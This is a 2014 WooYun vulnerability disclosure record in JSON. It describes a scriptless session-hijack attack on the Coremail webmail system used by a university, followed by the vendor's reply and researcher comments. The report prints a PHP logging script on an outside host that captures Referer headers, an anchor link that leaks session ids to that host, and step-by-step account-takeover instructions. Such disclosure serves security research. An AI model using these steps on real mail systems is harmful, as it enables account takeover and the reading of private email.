{"id": 1890, "wybug_id": "wooyun-2014-062137", "wybug_title": "Coremail邮件系统漏洞无脚本攻击劫持指定用户账号", "wybug_corp": "Coremail盈世信息科技（北京）有限公司", "wybug_author": "mramydnei", "wybug_date": "2014-05-24 14:10", "wybug_open_date": "2014-08-22 14:12", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向公众公开  简要描述： 几个小的问题的组合导致可劫持指定用户账号 详细说明：  测试对象： 使用Coremail邮件系统的某大学邮件系统测试地址： http://mail.**.edu.cn问题描述： 这个问题由几个小问题的组合所导致。第一个问题：Coremail邮件系统在用户登录成功后，会给用户分配一个32位大小写字母混搭的sid用于用户身份验证。只要用户没有logout，这个sid都不会被销毁且会作为参数出现在用户主界面的URL里，如下图所示。我们一旦获取了sid，就意味着我们可以盗用用户身份去登录用户邮箱。\n\n第二个问题： 就像第一个问题描述的那样，很多用于验证权限的参数和参数的值都会通过URL进行传递。当我们在邮件中插入我们远程服务器上的图片，如下图：\n\n并试图从referer中获取当前邮件的ssid，mid等等时发现获取的referer是空的。\nref: IP:210.39.***>.*** Time:2014.05.24 09:57:23\n继续再换一个方法，我们放弃插入图片，改用Anchor：<a href=\"//x55.me/ref.php\">click me babe</a>当用户点击我们加入到到邮件里的链接后，从下图可以看到我们获取了完整的URL，如下图：\n\nURL当中包含了，我们需要阅读这封邮件时的各种验证参数及其值。我们现在切换浏览器试图打开我们收到的referer。测试结果可成功读取邮件内容，如下图：\n\n这里你可能会觉得，读取了自己发送的邮件有什么用。请慢慢往下看。第三个问题 在问题二中，我们试图加入网络图片在邮件当中。现在我们试试上传本地图片功能。我们现在通过上传图片功能在邮件里上传一个图片并发送给受害者。最后再来看看邮件源码里的图片的地址。\n<img identifier=\"img_identifier_1400908716094\" src=\"/coremail/s?func=user:proxyGet&sid=BARrNLUUUlAwDLwyDaUUqmrWcdUAhYrj&mid=1:1tbiAQAOBVC9aUS31AAEst&url=%2Fcoremail%2FXJS%2Fimages%2Fing_yellow.gif\">\n从图中不难想像这里做了一个权限验证。如果你想要访问我们服务器上的被上传的文件，最起码你得是我们的用户。所以就要验证一下sid。现在我们将这三个问题整合一下，描述一下大概的攻击流程：1.给目标用户发送一个邮件。邮件里添加一个超级链接，地址为: http://x55.me/ref.phpref.php的内容很简单：\n<?phpfile_put_contents(\"test.txt\",  \" ref:\".$_SERVER[\"HTTP_REFERER\"], FILE_APPEND);  file_put_contents(\"test.txt\",  \" IP:\".$_SERVER[\"REMOTE_ADDR\"], FILE_APPEND); file_put_contents(\"test.txt\",  \" Time:\".date(\"Y.m.d H:i:s\").\"\\r\\n\",FILE_APPEND); ?>\n这一步是为了通过远程图片，获取referer进而盗取当前邮件的ssid，mid等等进而达到阅读用户邮件的目的。然后我们在邮件里，通过上传本地图片的方式，上传一个图片文件。这一步骤是为了，让邮件里包含用户的sid。这样一来我们在越权阅读邮件时就可以窃取到用户sid进而劫持用户账号了。   漏洞证明：  发送符合上述描述的邮件：\n\n用户点击后，查看收到的referer：\n\n在别的浏览器里打开referer中的URL，查看html源码里的sid：\n\n最后构造URL：mail.szu.edu.cn/coremail/XJS/index.jsp?sid=这里是刚才截获的sid，并成功登录\n\n   修复方案：  暂无   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-26 11:04 厂商回复： 相关系统因为某种配置原因降低了默认安全级别，导致内部可信任用户之间通信安全检查降低，已针对性建议相关客户提高安全策略配置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-24 14:11 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  - 秒回复    \n     2014-05-24 14:12 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  楼上还我的沙发。。。。    \n     2014-05-24 14:35 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  擦，大洞，求coremail审核技巧啊    \n     2014-05-24 17:10 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  @YwiSax 求coremail代码啊    \n     2014-05-25 11:37 |    \t\tI am XiaoM \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 看着大家的Rank我深深被伤了...)\t\t \n  关注！    \n     2014-05-30 11:49 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:398 漏洞数:90        | 看我看我看我啊)\t\t \n  求详情啊。    \n     2014-08-22 19:34 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  10分。 所属分类xss请问这和xss有什么关系？也是要用户点一下的,同是这样的应用场景,为什么一个反射型xss就被拒收? 我反射型下的coremail xss不能拿到这个sid?玩过wap.renren.com都知道这是一个referrer引起的泄露，只要在url加个token就可以更好的解决这个问题的手机weibo以前也有这个sid泄露问题给10分 真的无法理解整篇文章用一句话就可以概括的....    \n     2014-08-22 20:07 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @xsser_w 不明白你想证明的是啥。想证明我不懂scriptless attack和xss的区别，还是想证明反射型XSS的危害更大一些？如果你有办法让反射型XSS在IE和Chrome下用起来，我觉得可以继续讨论一下。当然，我口中的用起来，不是用双参数，参数复用又或者是一些算不上bypass的DOM XSS案例。如果不是写给我的，上面的话你就当我没说过就好了 乌云越来越没意思了    \n     2014-08-22 20:16 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  @mramydnei 我没说不是你写的    \n     2014-12-16 12:46 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  @mramydnei 深圳大学的？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}